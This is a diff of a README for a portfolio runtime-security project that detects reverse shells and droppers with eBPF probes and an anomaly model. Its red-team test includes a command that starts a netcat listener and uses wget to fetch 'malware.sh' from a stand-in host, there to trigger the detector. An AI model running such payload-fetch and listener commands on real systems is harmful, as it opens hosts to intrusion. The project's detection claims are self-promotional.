@@ -1,10 +1,10 @@
-# SecureSME - DevSecOps Enabled Evidence Management Platform
+# SecureSME - Cloud-Native Runtime Security Engine
 
 ![Build Status](https://github.com/Murashidzi/SecureSME-Platform/actions/workflows/security-scan.yml/badge.svg)
 ![Python](https://img.shields.io/badge/Python-3.12-blue)
 ![Architecture](https://img.shields.io/badge/Architecture-Distributed%20Microservices-orange)
 ![eBPF](https://img.shields.io/badge/Kernel-eBPF_Observability-red)
-![Docker](https://img.shields.io/badge/Docker-Enabled-blue)
+![ML](https://img.shields.io/badge/AI-Isolation_Forest-purple)
 
 ## Portfolio Evidence
 ### 1. eBPF Kernel-Level Threat Detection
@@ -14,41 +14,55 @@
 ### 2. Distributed Alerting System
 *Asynchronous processing of heavy log files using Redis & Celery worker nodes.*
 
-## Architecture
+---
 
-The platform utilizes a dual-sensor architecture: asynchronous log parsing (User Space) and real-time system call tracing (Kernel Space).
+## Architecture: Dual-Sensor Defense
+
+SecureSME utilizes a hybrid detection strategy, combining asynchronous log parsing (User Space) for legacy forensic analysis with AI-driven system call tracing (Kernel Space) for zero-day threat prevention.
 
 ```mermaid
 graph TD
-    Attacker["Attacker (Compromised Pod)"] -->|"Runs malware.sh"| Syscall["sys_execve (Kernel Ring 0)"]
-
-    subgraph eBPF Security Agent
-    Syscall -->|"Intercept"| BPF["eBPF Probe"]
-    BPF -->|"Perf Buffer"| Monitor["Python User-Space Monitor"]
+    %% Legacy Log Pipeline
+    subgraph Reactive Sensor (User Space)
+        User["Forensic Analyst"] -->|"Upload auth.log"| API["Flask API Gateway"]
+        API -->|"Queue Task"| Redis["Redis Message Broker"]
+        Redis -->|"Pop Task"| Worker["Celery Worker Node"]
+        Worker -->|"Regex Threat Parsing"| DB[("PostgreSQL")]
     end
 
-    Monitor -->|"HTTP POST (Alert)"| API["Flask API Gateway"]
-    API -->|"Persist Data"| DB[("PostgreSQL")]
+    %% Modern eBPF Pipeline
+    subgraph Proactive Sensor (Kernel Space)
+        Attacker["Attacker (Compromised Pod)"] -->|"Runs malware"| Syscall["sys_execve (Ring 0)"]
+        Syscall -->|"Intercept"| BPF["eBPF Probe"]
+        BPF -->|"Perf Buffer"| Agent["Python Security Agent"]
+        Agent -->|"Feature Extraction"| ML["Isolation Forest (AI)"]
+        ML -->|"-1 (Anomaly Detected)"| API
+    end
+
+    %% Frontend
+    DB -->|"Fetch Telemetry"| UI["React PWA Dashboard"
 ```
 
 ## Key Features
 
-* **eBPF Runtime Monitoring:** A privileged Docker container running an eBPF probe that hooks into the Linux kernel to detect reverse shells, unauthorized binary execution (wget, nc), and privilege escalation attempts.
+* **Kernel Observability (eBPF):** A privileged Docker container running an eBPF probe that hooks into the Linux kernel to gain immutable, Ring-0 visibility across all workloads.
 
-* **Distributed Event Processing:** Decoupled the ingestion layer from the analysis layer using Celery and Redis, allowing the system to process gigabytes of log data in the background.
+* **AI Anomaly Detection:** Replaces rigid regex rules with an Unsupervised Machine Learning model (Isolation Forest) deployed at the edge to mathematically detect zero-day reverse shells and droppers.
 
-* **Adversarial Validation:** Architecture successfully tested against simulated container-escape and living-off-the-land (LotL) attack chains.
+* **Automated Threat Intelligence:** Parses unstructured server logs (syslog, auth.log) to identify high-severity incidents like SSH brute force and Root access attempts.
 
-* **Containerized Infrastructure:** Fully Dockerized microservices orchestrating the API, Worker, Database, Broker, and eBPF Agent.
+* **Adversarial Validation:** Architecture successfully red-teamed against simulated container-escape and living-off-the-land (LotL) attack chains.
 
-* **DevSecOps Pipeline:** Integrated Bandit (SAST) and Safety into GitHub Actions.
+* **DevSecOps Pipeline:** Integrated Bandit (SAST) and Safety dependency scanning into GitHub Actions to block vulnerable code.
 
 
 ## Tech Stack
 
 * **Kernel Observability:** eBPF (BCC Library), C, Python
+* **Machine Learning:** Scikit-Learn, Pandas, Joblib
 * **Core Backend:** Python 3.12, Flask, SQLAlchemy
 * **Async Infrastructure:** Celery, Redis
+* **Frontend:** React, TailwindCSS
 * **Database:** PostgreSQL
 * **DevOps:** Docker, Docker Compose, GitHub Actions
 
@@ -68,21 +82,25 @@ graph TD
     ```sudo docker exec securesme_api python init_db.py```
 
 
-4.  **Access the Dashboard**
-    * Frontend: `http://localhost:5173`
-    * API: `http://localhost:5000`
-
 ##  Adversarial Testing (Red Teaming)
-* Test the kernel probe by simulating an attacker inside an isolated container downloading a payload:
-1. **Monitor the API logs:
+* **Test A: The Reactive Engine (Log Analysis)**
+1. **Trigger a forensic log upload via the API:**
    ```bash
+    curl -X POST -F "file=@heavy_attack.log" http://localhost:5000/api/upload
+    ```
+2. **Verify asynchronous background processing::**
+    ```bash
+    sudo docker logs -f securesme_worker
+    ```
+**Test B: The Proactive Engine (AI Kernel Probe): Simulate an attacker inside an isolated container executing a malicious payload:**
+
+1. **Monitor the Flask API ingestion:**
+    ```bash
     sudo docker logs -f securesme_api
     ```
-2. Launch the attack from a new terminal
+2. **Launch the attack from a new terminal:**
     ```bash
     sudo docker run --rm alpine sh -c "apk add --no-cache netcat-openbsd && nc -lvp 4444 & wget [http://example.com/malware.sh](http://example.com/malware.sh)"
     ```
-3. Result: The API will immediately log a high-fidelity kernel alert detecting wget and nc execution, proving the attacker cannot hide from the kernel.
-
 ---
-*Built by Murashidzi as a demonstration of DevSecOps and Software Engineering principles.*
+*Engineered by Murashidzi as a demonstration of DevSecOps and Software Engineering principles.*
